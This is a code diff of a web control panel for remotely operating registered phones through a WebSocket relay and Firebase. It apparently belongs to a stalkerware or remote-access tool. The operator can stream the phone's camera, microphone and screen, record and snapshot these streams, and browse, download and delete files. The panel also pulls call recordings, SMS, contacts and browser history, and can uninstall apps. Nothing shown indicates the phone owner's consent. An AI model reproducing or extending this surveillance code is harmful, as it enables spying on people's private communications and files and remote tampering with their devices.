     list.innerHTML='';
-    if(snap.empty) list.innerHTML='<p style="color:#999; text-align:center;">No devices registered.</p>';
-    else snap.forEach(doc=>{ const d=doc.data(); const div=document.createElement('div'); div.className='device-item'; div.onclick=()=>selectDevice(d.deviceId,d.name||'Unknown'); div.innerHTML=`<span class="device-icon">📱</span><div class="device-info"><div class="device-name">${escapeHtml(d.name||'Unnamed device')}</div><div class="device-id">${escapeHtml(d.deviceId)}</div></div>`; list.appendChild(div); });
+    if(snap.empty) list.innerHTML='<p style="color:#999;">No devices registered.</p>';
+    else snap.forEach(doc=>{ const d=doc.data(); const div=document.createElement('div'); div.className='device-item'; div.onclick=()=>selectDevice(d.deviceId,d.name||'Unknown'); div.innerHTML=`<span style="font-size:24px;">📱</span><div style="margin-left:12px;"><div><strong>${escapeHtml(d.name||'Unnamed')}</strong></div><div style="font-size:12px; color:#666;">${escapeHtml(d.deviceId)}</div></div>`; list.appendChild(div); });
     document.getElementById('deviceListContainer').style.display='flex';
 }
 window.leaveDevice = function() {
@@ -327,11 +556,11 @@ function connectWebSocket(){
     if(reconnectTimer)clearTimeout(reconnectTimer);
     setStatus('CONNECTING');
     wsDebug.innerText='🌐 WebSocket: connecting...';
-    panel.innerHTML='⏳ Connecting to server...';
-    ws=new WebSocket(CONFIG.WS_URL);
+    panel.innerHTML='⏳ Connecting...';
+    ws=new WebSocket("wss://mirror-view.onrender.com");
     ws.onopen=()=>{ reconnectAttempts=0; ws.send('I_AM_WEB'); setStatus('ONLINE'); panel.innerHTML='✅ Connected.'; wsDebug.innerText='🌐 WebSocket: ONLINE'; };
     ws.onmessage=e=>handleIncomingMessage(e.data);
-    ws.onclose=()=>{ setStatus('OFFLINE'); wsDebug.innerText='🌐 WebSocket: closed'; panel.innerHTML='🔌 Disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.'; ws=null; const d=Math.min(1000*Math.pow(1.5,reconnectAttempts),CONFIG.MAX_RECONNECT_DELAY); reconnectAttempts++; reconnectTimer=setTimeout(()=>connectWebSocket(),d); };
+    ws.onclose=()=>{ setStatus('OFFLINE'); wsDebug.innerText='🌐 WebSocket: closed'; panel.innerHTML='🔌 Disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.'; ws=null; const d=Math.min(1000*Math.pow(1.5,reconnectAttempts),30000); reconnectAttempts++; reconnectTimer=setTimeout(()=>connectWebSocket(),d); };
     ws.onerror=()=>{ setStatus('ERROR'); wsDebug.innerText='🌐 WebSocket: error'; };
 }
 function manualReconnect(){ if(reconnectTimer)clearTimeout(reconnectTimer); if(ws)ws.close(); reconnectAttempts=0; connectWebSocket(); }
@@ -345,15 +574,14 @@ function sendCommand(cmd,params={}){
 }
 function sendPlainText(t){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(t); }
 
-// ==================== WEBRTC WITH RETRY AND ENHANCED ICE ====================
-function createPeerConnection(type, onTrack, useMic, iceServers = ICE_SERVERS){
-    const pc = new RTCPeerConnection({ iceServers: iceServers });
+// ==================== WEBRTC ====================
+function createPeerConnection(type,onTrack,useMic){
+    const pc=new RTCPeerConnection({iceServers:ICE_SERVERS});
     if(type==='screen') pc.addTransceiver('video',{direction:'recvonly'});
-    else if(type==='camera'){ pc.addTransceiver('video',{direction:'recvonly'}); if(useMic) pc.addTransceiver('audio',{direction:'recvonly'}); }
+    else if(type==='camera'){ pc.addTransceiver('video',{direction:'recvonly'}); if(useMic)pc.addTransceiver('audio',{direction:'recvonly'}); }
     else if(type==='audio') pc.addTransceiver('audio',{direction:'recvonly'});
-    pc.ontrack = onTrack;
-    pc.onicecandidate = e => { if(e.candidate) sendSignaling({type:'ICE_CANDIDATE', candidate:e.candidate, streamType:type}); };
-    pc.oniceconnectionstatechange = () => console.log(`${type} ICE state:`, pc.iceConnectionState);
+    pc.ontrack=onTrack;
+    pc.onicecandidate=e=>{ if(e.candidate) sendSignaling({type:'ICE_CANDIDATE',candidate:e.candidate,streamType:type}); };
     return pc;
 }
 function sendSignaling(msg){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(JSON.stringify({type:'SIGNALING',deviceId:selectedDeviceId,data:msg})); }
@@ -361,8 +589,7 @@ function handleSignaling(msg){
     if(msg.type==='ANSWER'){ const pc=msg.streamType==='screen'?screenPC:msg.streamType==='camera'?cameraPC:audioPC; if(pc) pc.setRemoteDescription(new RTCSessionDescription({type:'answer',sdp:msg.sdp})); }
     else if(msg.type==='ICE_CANDIDATE'){ const pc=msg.streamType==='screen'?screenPC:msg.streamType==='camera'?cameraPC:audioPC; if(pc&&msg.candidate) pc.addIceCandidate(new RTCIceCandidate(msg.candidate)); }
 }
-
-// Screen share (unchanged)
+// Screen share
 async function toggleScreen(){
     if(screenActive){
         if(screenPC)screenPC.close(); screenPC=null; screenActive=false;
@@ -380,7 +607,11 @@ async function toggleScreen(){
         screenActive=true;
     }
 }
-// Camera modal (unchanged)
+document.getElementById('modalSnapBtn').onclick=()=>{ const v=document.getElementById('modalScreenVideo'); if(v&&v.videoWidth){ const c=document.createElement('canvas'); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); c.toBlob(b=>{ const a=document.createElement('a'); a.href=URL.createObjectURL(b); a.download=`screen_${Date.now()}.png`; a.click(); URL.revokeObjectURL(b); }); } };
+document.getElementById('modalRecordBtn').onclick=()=>{ const v=document.getElementById('modalScreenVideo'); if(!v.srcObject)return; if(screenMediaRecorder&&screenMediaRecorder.state==='recording'){ screenMediaRecorder.stop(); document.getElementById('modalRecordBtn').innerText='🔴'; }else{ screenRecordedChunks=[]; const canvas=document.createElement('canvas'); const ctx=canvas.getContext('2d'); const draw=()=>{ if(v.videoWidth){ canvas.width=v.videoWidth; canvas.height=v.videoHeight; ctx.drawImage(v,0,0,canvas.width,canvas.height); } requestAnimationFrame(draw); }; draw(); const canvasStream=canvas.captureStream(30); v.srcObject.getAudioTracks().forEach(t=>canvasStream.addTrack(t)); screenMediaRecorder=new MediaRecorder(canvasStream); screenMediaRecorder.ondataavailable=e=>screenRecordedChunks.push(e.data); screenMediaRecorder.onstop=()=>{ const blob=new Blob(screenRecordedChunks,{type:'video/webm'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`screen_${Date.now()}.webm`; a.click(); URL.revokeObjectURL(blob); canvasStream.getTracks().forEach(t=>t.stop()); }; screenMediaRecorder.start(); document.getElementById('modalRecordBtn').innerText='🟢'; } };
+document.getElementById('modalFullscreenBtn').onclick=()=>{ const v=document.getElementById('modalScreenVideo'); if(v.requestFullscreen)v.requestFullscreen(); };
+document.getElementById('modalCloseBtn').onclick=()=>{ document.getElementById('screenModalOverlay').classList.remove('show'); document.body.classList.remove('modal-open'); if(screenMediaRecorder&&screenMediaRecorder.state==='recording')screenMediaRecorder.stop(); if(screenPC)screenPC.close(); screenPC=null; screenActive=false; document.getElementById('screenBtn').innerText='Start Screen'; };
+// Camera modal
 function showCameraModal(stream, cameraType){
     const modal=document.getElementById('cameraModalOverlay');
     const video=document.getElementById('modalCameraVideo');
@@ -421,76 +652,97 @@ function showCameraModal(stream, cameraType){
         if(cameraType === 'back') sendCommand('FLASH_OFF');
     };
 }
-// ========== ENHANCED LIVE CAMERA WITH NETWORK FALLBACK ==========
-async function startLiveCameraWithRetry(retryCount = 0) {
-    const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
-    const useFlash = document.getElementById('liveFlashCheckbox').checked;
-    const useMic = document.getElementById('liveMicCheckbox').checked;
-    
+// Live camera with retry
+async function startLiveCameraWithRetry(retry=0){
+    const camera=document.querySelector('input[name="liveCameraSelect"]:checked').value;
+    const useFlash=document.getElementById('liveFlashCheckbox').checked;
+    const useMic=document.getElementById('liveMicCheckbox').checked;
     if(useFlash && camera === 'back') sendCommand('FLASH_ON');
-    
-    // Create a timeout to detect connection failure
-    let connectionTimeout = setTimeout(() => {
-        if(cameraPC && cameraPC.iceConnectionState !== 'connected' && cameraPC.iceConnectionState !== 'completed') {
-            console.warn('ICE connection timeout, retrying...');
-            if(cameraPC) cameraPC.close();
-            if(retryCount < 2) {
-                showNotification('Connection slow, retrying with fallback servers...');
-                startLiveCameraWithRetry(retryCount + 1);
-            } else {
-                showNotification('Unable to establish video stream. Check network.');
-                panel.innerHTML = '<div style="color:red;">❌ Failed to start live camera. Try again later.</div>';
-            }
-        }
-    }, 15000);
-    
-    // Use different ICE servers on retry (simplified – just use the same but the retry itself helps)
+    // Create video element in panel
+    panel.innerHTML = `<div style="position:relative;"><video id="liveCamVideo" autoplay playsinline style="width:100%; max-height:500px; background:#000;"></video><div class="live-controls" style="margin-top:10px; display:flex; gap:8px;"><button onclick="takeSnapshot()" style="background:#1976ff; color:white; border:none; padding:8px; border-radius:8px;">📸 Snapshot</button><button onclick="toggleRecording()" style="background:#ff9800; color:white; border:none; padding:8px; border-radius:8px;">🔴 Record</button><button class="stop" onclick="stopLiveStream()" style="background:#d32f2f; color:white; border:none; padding:8px; border-radius:8px;">⏹ Stop</button></div></div>`;
     cameraPC = createPeerConnection('camera', (e) => {
-        clearTimeout(connectionTimeout);
         const videoEl = document.getElementById('liveCamVideo');
         if(videoEl && e.streams[0]) {
             videoEl.srcObject = e.streams[0];
             videoEl.muted = false;
-            videoEl.play().catch(err => console.warn('autoplay error:', err));
+            videoEl.play().catch(err=>console.warn(err));
             showNotification('Live camera connected');
         }
     }, useMic);
-    
+    // Timeout retry
+    let timeout = setTimeout(() => {
+        if(cameraPC && cameraPC.iceConnectionState !== 'connected' && retry < 2) {
+            console.warn('ICE timeout, retrying');
+            cameraPC.close();
+            startLiveCameraWithRetry(retry+1);
+        }
+    }, 15000);
     try {
         const offer = await cameraPC.createOffer();
         await cameraPC.setLocalDescription(offer);
         sendSignaling({type:'OFFER', sdp:offer.sdp, streamType:'camera', camera, flash:useFlash, mic:useMic});
-        // If ICE gathering fails, fallback after 5 seconds
-        setTimeout(() => {
-            if(cameraPC && cameraPC.iceGatheringState !== 'complete' && retryCount < 2) {
-                console.log('ICE gathering incomplete, restarting...');
-                cameraPC.close();
-                startLiveCameraWithRetry(retryCount + 1);
-            }
-        }, 5000);
     } catch(e) {
-        clearTimeout(connectionTimeout);
-        console.error('Offer creation failed:', e);
-        if(retryCount < 2) {
-            showNotification('Retrying camera connection...');
-            setTimeout(() => startLiveCameraWithRetry(retryCount + 1), 1000);
-        } else {
-            showNotification('Failed to start camera: ' + e.message);
-            panel.innerHTML = '<div style="color:red;">❌ Failed to start live camera.</div>';
-        }
+        clearTimeout(timeout);
+        if(retry < 2) startLiveCameraWithRetry(retry+1);
+        else showNotification('Camera failed: '+e.message);
     }
 }
-// Wrapper for backward compatibility
-async function startLiveCamera() { await startLiveCameraWithRetry(0); }
-
-function stopLiveStream(){ 
-    if(cameraPC)cameraPC.close(); 
-    cameraPC=null; 
-    sendSignaling({type:'STOP_CAMERA'}); 
+function startLiveStream() { startLiveCameraWithRetry(0); }
+function stopLiveStream(){
+    if(cameraPC)cameraPC.close();
+    cameraPC=null;
+    sendSignaling({type:'STOP_CAMERA'});
     sendCommand('FLASH_OFF');
-    panel.innerHTML='Ready.'; 
+    panel.innerHTML='Ready.';
 }
-// Audio (unchanged)
+function takeSnapshot(){
+    const video = document.getElementById('liveCamVideo');
+    if(!video || !video.videoWidth) return;
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video,0,0);
+    canvas.toBlob(blob=>{ const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`snapshot_${Date.now()}.png`; a.click(); URL.revokeObjectURL(blob); });
+}
+function toggleRecording(){
+    const video = document.getElementById('liveCamVideo');
+    if(!video || !video.srcObject) return;
+    if(mediaRecorder && mediaRecorder.state==='recording'){
+        mediaRecorder.stop();
+        document.getElementById('recordBtn').innerText='🔴 Record';
+    } else {
+        recordedChunks=[];
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const stream = video.srcObject;
+        if(video.videoWidth===0){
+            video.onloadedmetadata = ()=>startCanvasRecording(video,canvas,ctx,stream);
+        } else startCanvasRecording(video,canvas,ctx,stream);
+    }
+}
+function startCanvasRecording(video,canvas,ctx,originalStream){
+    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+    const draw = ()=>{
+        ctx.drawImage(video,0,0,canvas.width,canvas.height);
+        requestAnimationFrame(draw);
+    };
+    draw();
+    const canvasStream = canvas.captureStream(30);
+    originalStream.getAudioTracks().forEach(t=>canvasStream.addTrack(t));
+    mediaRecorder = new MediaRecorder(canvasStream, {mimeType:'video/webm'});
+    mediaRecorder.ondataavailable = e=>recordedChunks.push(e.data);
+    mediaRecorder.onstop = ()=>{
+        const blob = new Blob(recordedChunks, {type:'video/webm'});
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = `recording_${Date.now()}.webm`;
+        a.click();
+        URL.revokeObjectURL(blob);
+        canvasStream.getTracks().forEach(t=>t.stop());
+    };
+    mediaRecorder.start();
+    document.getElementById('recordBtn').innerText='🟢 Stop';
+}
+// Audio
 function showAudioModal(stream){
     const modal=document.getElementById('audioModalOverlay');
     const audio=document.getElementById('modalAudioPlayer');
@@ -519,38 +771,37 @@ async function startLiveAudio(){
 }
 function stopLiveAudio(){ if(audioPC)audioPC.close(); audioPC=null; sendSignaling({type:'STOP_AUDIO'}); document.getElementById('liveAudioBtn').style.display='block'; document.getElementById('stopLiveAudioBtn').style.display='none'; panel.innerHTML='Ready.'; }
 
-// ==================== FILE MANAGER (sorted, fixed toolbar) ====================
+// ==================== FILE MANAGER ====================
 function renderFileTreeNodes(data, path) {
     const folders = data.filter(i=>i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
     const files = data.filter(i=>!i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
     let html = '';
-    folders.forEach(f=>{ 
+    folders.forEach(f=>{
         const encPath = btoa(encodeURIComponent(f.path)).replace(/=/g,'');
-        html+=`<li><div class="folder-header" data-path="${escapeHtml(f.path)}"><span class="chevron">▶</span><span class="folder-icon">📁</span><span class="item-name">${escapeHtml(f.name)}</span></div><div class="tree-children" id="tree-container-${encPath}"><ul class="tree-children-inner" id="tree-inner-${encPath}"></ul></div></li>`; 
+        html+=`<li><div class="folder-header" data-path="${escapeHtml(f.path)}"><span class="chevron">▶</span><span class="folder-icon">📁</span><span class="item-name">${escapeHtml(f.name)}</span></div><div class="tree-children" id="tree-container-${encPath}"><ul class="tree-children-inner" id="tree-inner-${encPath}"></ul></div></li>`;
     });
-    files.forEach(f=>{ 
-        html+=`<li><div class="file-row"><span class="file-icon">📄</span><span class="item-name">${escapeHtml(f.name)}</span><span class="file-size">${formatBytes(f.size)}</span><div class="file-actions"><button class="file-action-btn dl" data-path="${escapeHtml(f.path)}">⬇️</button><button class="file-action-btn del" data-path="${escapeHtml(f.path)}">🗑️</button></div></div></li>`; 
+    files.forEach(f=>{
+        html+=`<li><div class="file-row"><span class="file-icon">📄</span><span class="item-name">${escapeHtml(f.name)}</span><span class="file-size">${formatBytes(f.size)}</span><div class="file-actions"><button class="file-action-btn dl" data-path="${escapeHtml(f.path)}">⬇️</button><button class="file-action-btn del" data-path="${escapeHtml(f.path)}">🗑️</button></div></div></li>`;
     });
     if(folders.length===0 && files.length===0) html+=`<li style="padding:10px 20px; color:#999;">Empty folder</li>`;
     return html;
 }
 function renderFiles() {
-    let html=`<div class="file-manager"><div class="file-toolbar-sticky"><div class="file-toolbar"><button onclick="navigateUp()">⬆ Up</button><div style="display: flex; gap: 8px; margin-left: auto;"><button onclick="downloadSelected()">⬇️ <span id="downloadCount">${selectedFiles.length}</span></button><button onclick="deleteSelected()" style="background:#d32f2f;color:white;">🗑️ <span id="deleteCount">${selectedFiles.length}</span></button></div></div></div><div class="tree-content"><ul class="tree-root" id="tree-root-container">`;
+    let html=`<div class="file-manager"><div class="file-toolbar-sticky"><div style="display:flex; gap:8px;"><button onclick="navigateUp()">⬆ Up</button><div style="margin-left:auto;"><button onclick="downloadSelected()">⬇️ <span id="downloadCount">${selectedFiles.length}</span></button><button onclick="deleteSelected()" style="background:#d32f2f;color:white; margin-left:8px;">🗑️ <span id="deleteCount">${selectedFiles.length}</span></button></div></div></div><div class="tree-content"><ul class="tree-root" id="tree-root-container">`;
     if(currentData && currentData.length) {
-        const sortedData = [...currentData];
-        const folders = sortedData.filter(i=>i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
-        const files = sortedData.filter(i=>!i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
-        const allSorted = [...folders, ...files];
-        html += renderFileTreeNodes(allSorted, 'root');
+        const sorted = [...currentData];
+        const folders = sorted.filter(i=>i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
+        const files = sorted.filter(i=>!i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
+        html += renderFileTreeNodes([...folders, ...files], 'root');
     } else { html += '<li style="padding:10px; color:#999;">No files or root not loaded yet.</li>'; }
     html += `</ul></div></div>`;
     panel.innerHTML = html;
     attachFileEventListeners();
 }
 function attachFileEventListeners() {
-    document.querySelectorAll('.folder-header').forEach(header => { header.removeEventListener('click', folderClickHandler); header.addEventListener('click', folderClickHandler); });
-    document.querySelectorAll('.file-action-btn.dl').forEach(btn => { btn.removeEventListener('click', downloadClickHandler); btn.addEventListener('click', downloadClickHandler); });
-    document.querySelectorAll('.file-action-btn.del').forEach(btn => { btn.removeEventListener('click', deleteClickHandler); btn.addEventListener('click', deleteClickHandler); });
+    document.querySelectorAll('.folder-header').forEach(h=>{ h.removeEventListener('click', folderClickHandler); h.addEventListener('click', folderClickHandler); });
+    document.querySelectorAll('.file-action-btn.dl').forEach(b=>{ b.removeEventListener('click', downloadClickHandler); b.addEventListener('click', downloadClickHandler); });
+    document.querySelectorAll('.file-action-btn.del').forEach(b=>{ b.removeEventListener('click', deleteClickHandler); b.addEventListener('click', deleteClickHandler); });
 }
 function folderClickHandler(e) {
     e.stopPropagation();
@@ -560,12 +811,12 @@ function folderClickHandler(e) {
     const container = document.getElementById(`tree-container-${encPath}`);
     const inner = document.getElementById(`tree-inner-${encPath}`);
     const chevron = header.querySelector('.chevron');
-    if(container.classList.contains('expanded')) {
+    if(container.classList.contains('expanded')){
         container.classList.remove('expanded');
         chevron.classList.remove('down');
     } else {
         chevron.classList.add('down');
-        if(inner.innerHTML.trim() !== '') { container.classList.add('expanded'); }
+        if(inner.innerHTML.trim() !== '') container.classList.add('expanded');
         else {
             inner.innerHTML = '<li style="padding:10px 20px; color:#999;">Loading...</li>';
             container.classList.add('expanded');
@@ -574,52 +825,51 @@ function folderClickHandler(e) {
         }
     }
 }
-function downloadClickHandler(e) { e.stopPropagation(); const path = e.currentTarget.getAttribute('data-path'); if(path) { sendPlainText('dl ' + path); showNotification(`Download requested: ${path.split('/').pop()}`); } }
-function deleteClickHandler(e) { e.stopPropagation(); const path = e.currentTarget.getAttribute('data-path'); if(path && confirm(`Delete file: ${path.split('/').pop()}?`)) sendCommand('DELETE_FILE', {path: path}); }
-window.refreshFileRoot = function() { sendCommand('LIST_FILES', {path: 'root'}); panel.innerHTML = '<p style="color:var(--text-sec); padding:16px;">⏳ Fetching files...</p>'; };
-function navigateUp() { if (currentPath === 'root' || currentPath === '') return; let parts = currentPath.split('/'); parts.pop(); let parent = parts.join('/'); if (parent === '') parent = 'root'; currentPath = parent; sendCommand('LIST_FILES', { path: parent }); }
-function downloadSelected() { if (selectedFiles.length === 0) { alert('No files selected'); return; } selectedFiles.forEach(path => sendPlainText('dl ' + path)); }
-function deleteSelected() { if (selectedFiles.length === 0) { alert('No files selected'); return; } if (!confirm(`Delete ${selectedFiles.length} file(s)?`)) return; selectedFiles.forEach(path => sendCommand('DELETE_FILE', { path: path })); selectedFiles = []; updateCounters(); }
-function updateSelected(checkbox) { const path = checkbox.dataset.path; if (checkbox.checked) { if (!selectedFiles.includes(path)) selectedFiles.push(path); } else { selectedFiles = selectedFiles.filter(p => p !== path); } updateCounters(); }
-function updateCounters() { const count = selectedFiles.length; const downloadSpan = document.getElementById('downloadCount'); const deleteSpan = document.getElementById('deleteCount'); if (downloadSpan) downloadSpan.innerText = count; if (deleteSpan) deleteSpan.innerText = count; }
+function downloadClickHandler(e) { e.stopPropagation(); const path = e.currentTarget.getAttribute('data-path'); if(path) { sendPlainText('dl ' + path); showNotification(`Download: ${path.split('/').pop()}`); } }
+function deleteClickHandler(e) { e.stopPropagation(); const path = e.currentTarget.getAttribute('data-path'); if(path && confirm(`Delete ${path.split('/').pop()}?`)) sendCommand('DELETE_FILE', {path: path}); }
+window.refreshFileRoot = function() { sendCommand('LIST_FILES', {path: 'root'}); panel.innerHTML = '<p>Fetching files...</p>'; };
+function navigateUp() { if (currentPath === 'root' || currentPath === '') return; let parts = currentPath.split('/'); parts.pop(); let parent = parts.join('/'); if(parent==='') parent='root'; currentPath=parent; sendCommand('LIST_FILES', {path: parent}); }
+function downloadSelected() { if(selectedFiles.length===0){ alert('No files selected'); return; } selectedFiles.forEach(p=>sendPlainText('dl '+p)); }
+function deleteSelected() { if(selectedFiles.length===0){ alert('No files selected'); return; } if(!confirm(`Delete ${selectedFiles.length} file(s)?`)) return; selectedFiles.forEach(p=>sendCommand('DELETE_FILE',{path:p})); selectedFiles=[]; updateCounters(); }
+function updateSelected(checkbox) { const path=checkbox.dataset.path; if(checkbox.checked){ if(!selectedFiles.includes(path)) selectedFiles.push(path); } else { selectedFiles=selectedFiles.filter(p=>p!==path); } updateCounters(); }
+function updateCounters() { const c=selectedFiles.length; const dl=document.getElementById('downloadCount'); const del=document.getElementById('deleteCount'); if(dl) dl.innerText=c; if(del) del.innerText=c; }
 
-// ==================== CALL RECORDINGS (Firebase with userId filter) ====================
+// ==================== CALL RECORDINGS (Firebase) ====================
 async function showCallRecordingsPanel() {
-    if (!selectedDeviceId) { panel.innerHTML = '<p>No device selected.</p>'; return; }
-    if (!currentUser) { panel.innerHTML = '<p>Please login.</p>'; return; }
-    panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p>Loading...</p>';
+    if(!selectedDeviceId){ panel.innerHTML='<p>No device selected.</p>'; return; }
+    if(!currentUser){ panel.innerHTML='<p>Please login.</p>'; return; }
+    panel.innerHTML='<h3>🎙️ Call Recordings</h3><p>Loading...</p>';
     try {
         let snapshot = null;
-        try {
-            snapshot = await db.collection('devices').doc(selectedDeviceId).collection('call_recordings').orderBy('timestamp', 'desc').get();
-        } catch(e) {}
-        if (!snapshot || snapshot.empty) {
+        // Try subcollection first
+        try { snapshot = await db.collection('devices').doc(selectedDeviceId).collection('call_recordings').orderBy('timestamp','desc').get(); } catch(e) {}
+        if(!snapshot || snapshot.empty) {
             snapshot = await db.collection('call_recordings')
-                .where('deviceId', '==', selectedDeviceId)
-                .where('userId', '==', currentUser.uid)
-                .orderBy('timestamp', 'desc')
+                .where('deviceId','==',selectedDeviceId)
+                .where('userId','==',currentUser.uid)
+                .orderBy('timestamp','desc')
                 .get();
         }
-        if (snapshot.empty) {
+        if(snapshot.empty) {
             panel.innerHTML = `<h3>🎙️ Call Recordings</h3><p>No recordings found. <button id="fallbackRecordingsBtn" class="btn-ui primary">Fetch from Device</button></p>`;
-            document.getElementById('fallbackRecordingsBtn')?.addEventListener('click', () => { sendCommand('GET_CALL_RECORDINGS', { days: 30 }); showNotification('Fetching from device...'); });
+            document.getElementById('fallbackRecordingsBtn')?.addEventListener('click',()=>{ sendCommand('GET_CALL_RECORDINGS',{days:30}); showNotification('Fetching from device...'); });
             return;
         }
         let html = '<h3>🎙️ Call Recordings (Firebase)</h3><div>';
-        snapshot.forEach(doc => {
+        snapshot.forEach(doc=>{
             const rec = doc.data();
-            const directionIcon = rec.direction === 'incoming' ? '📞' : '📤';
+            const dirIcon = rec.direction==='incoming'?'📞':'📤';
             const timestamp = rec.timestamp ? new Date(rec.timestamp).toLocaleString() : rec.timeFmt || 'Unknown';
-            const duration = rec.duration ? `${Math.floor(rec.duration / 60)}:${(rec.duration % 60).toString().padStart(2,'0')}` : '?';
-            html += `<div class="call-recording-card"><div><div><span>${directionIcon}</span> <strong>${escapeHtml(rec.number || 'Unknown')}</strong> ${rec.name ? `(${escapeHtml(rec.name)})` : ''}</div><div class="call-recording-details">${timestamp} • ${duration}</div></div><button class="download-recording-btn" data-url="${escapeHtml(rec.audioURL)}" data-filename="call_${rec.number}_${rec.timestamp}.m4a">⬇️ Download</button></div>`;
+            const duration = rec.duration ? `${Math.floor(rec.duration/60)}:${(rec.duration%60).toString().padStart(2,'0')}` : '?';
+            html += `<div class="call-recording-card"><div><span>${dirIcon}</span> <strong>${escapeHtml(rec.number||'Unknown')}</strong> ${rec.name?`(${escapeHtml(rec.name)})`:''}<br><small>${timestamp} • ${duration}</small></div><button class="download-recording-btn" data-url="${escapeHtml(rec.audioURL)}" data-filename="call_${rec.number}_${rec.timestamp}.m4a">⬇️ Download</button></div>`;
         });
         html += '</div>';
         panel.innerHTML = html;
-        document.querySelectorAll('.download-recording-btn').forEach(btn => {
-            btn.addEventListener('click', async () => {
+        document.querySelectorAll('.download-recording-btn').forEach(btn=>{
+            btn.addEventListener('click', async ()=>{
                 const url = btn.getAttribute('data-url');
                 const filename = btn.getAttribute('data-filename');
-                if (!url) return showNotification('No audio URL');
+                if(!url) return showNotification('No audio URL');
                 try {
                     showNotification('Downloading...');
                     const response = await fetch(url);
@@ -630,17 +880,17 @@ async function showCallRecordingsPanel() {
                     a.click();
                     URL.revokeObjectURL(a.href);
                     showNotification('Download complete');
-                } catch(e) { showNotification('Download failed'); }
+                } catch(e){ showNotification('Download failed'); }
             });
         });
     } catch(err) {
         console.error(err);
         panel.innerHTML = `<h3>🎙️ Call Recordings</h3><p style="color:red;">Error: ${err.message}</p><button id="fallbackDeviceBtn" class="btn-ui primary">Fetch from Device</button>`;
-        document.getElementById('fallbackDeviceBtn')?.addEventListener('click', () => { sendCommand('GET_CALL_RECORDINGS', { days: 30 }); });
+        document.getElementById('fallbackDeviceBtn')?.addEventListener('click',()=>{ sendCommand('GET_CALL_RECORDINGS',{days:30}); });
     }
 }
 
-// ==================== OTHER DISPLAY FUNCTIONS (simplified but functional) ====================
+// ==================== OTHER DISPLAY FUNCTIONS (simplified but complete) ====================
 function renderTable(rows,headers){
     const pageSize=20,total=Math.ceil(rows.length/pageSize),start=currentPage*pageSize;
     let html='<div style="overflow-x:auto;"><table><thead><tr>'+headers.map(h=>`<th>${h}</th>`).join('')+'</thead><tbody>';
@@ -651,12 +901,12 @@ function renderTable(rows,headers){
 }
 window.gotoPage=function(p){ currentPage=p; renderTable(); };
 function displaySMS(data){ if(!Array.isArray(data)) return; const rows=data.map(m=>[m.type==='inbox'||m.type===1?'📥 In':'📤 Out', m.address||m.number||'', m.body||'', m.date||m.timeFmt||'']); renderTable(rows,['Type','Number','Message','Date']); }
-function displayContacts(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Contacts</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Contacts (${data.length})</h3><div style="overflow-x:auto;"><td><thead><tr><th>Name</th><th>Number</th><th>Times Contacted</th></tr></thead><tbody>${data.map(c=>`<td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td style="text-align:center">${c.timesContacted||0}</td></tr>`).join('')}</tbody></table></div>`; }
-function displayInstalledApps(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Apps</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`; document.querySelectorAll('.open-app').forEach(btn=>btn.onclick=()=>sendCommand('OPEN_APP',{package:btn.dataset.pkg})); document.querySelectorAll('.remove-app').forEach(btn=>btn.onclick=()=>sendCommand('UNINSTALL_APP',{package:btn.dataset.pkg})); }
-function displayBrowserHistory(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Browser History</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Browser History (${data.length})</h3><div style="overflow-x:auto;"><tr><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<td>${escapeHtml(item.date||item.timeFmt||'')}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`; }
+function displayContacts(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Contacts</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Contacts (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Name</th><th>Number</th><th>Times Contacted</th></tr></thead><tbody>${data.map(c=>`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td style="text-align:center">${c.timesContacted||0}</td></tr>`).join('')}</tbody></table></div>`; }
